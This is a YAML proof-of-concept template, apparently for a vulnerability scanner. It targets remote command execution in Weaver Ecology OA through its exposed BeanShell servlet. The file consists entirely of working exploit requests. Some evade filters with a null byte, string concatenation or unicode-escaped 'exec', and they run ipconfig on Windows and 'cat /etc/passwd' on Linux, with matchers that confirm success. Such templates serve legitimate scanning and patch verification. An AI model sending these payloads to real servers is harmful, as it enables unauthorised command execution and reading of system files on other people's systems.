name: poc-yaml-weaver-ecology-rce
groups:
  win:
    - method: POST
      path: /weaver/bsh.servlet.BshServlet
      body:
        bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=ipconfig
      expression:
        response.status == 200 && response.body.bcontains(b"Windows IP")
    - method: POST
      path: /weaver/bsh.servlet.BshServlet
      body:
        bsh.script=\u0065\u0078\u0065\u0063("ipconfig");&bsh.servlet.output=raw
      expression:
        response.status == 200 && response.body.bcontains(b"Windows IP")
    - method: POST
      path: /weaver/bsh.servlet.BshServlet
      body:
        bsh.script=exec("ipconfig");&bsh.servlet.output=raw
      expression:
        response.status == 200 && response.body.bcontains(b"Windows IP")
  linux:
    - method: POST
      path: /weaver/bsh.servlet.BshServlet
      body:
        bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=cat /etc/passwd
      expression:
        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    - method: POST
      path: /weaver/bsh.servlet.BshServlet
      body:
        bsh.script=\u0065\u0078\u0065\u0063("cat /etc/passwd");&bsh.servlet.output=raw
      expression:
        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    - method: POST
      path: /weaver/bsh.servlet.BshServlet
      body:
        bsh.script=exec("cat /etc/passwd");&bsh.servlet.output=raw
      expression:
        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
detail:
  author: sakura404x
  links:
    - https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204
    - https://www.freebuf.com/vuls/215218.html
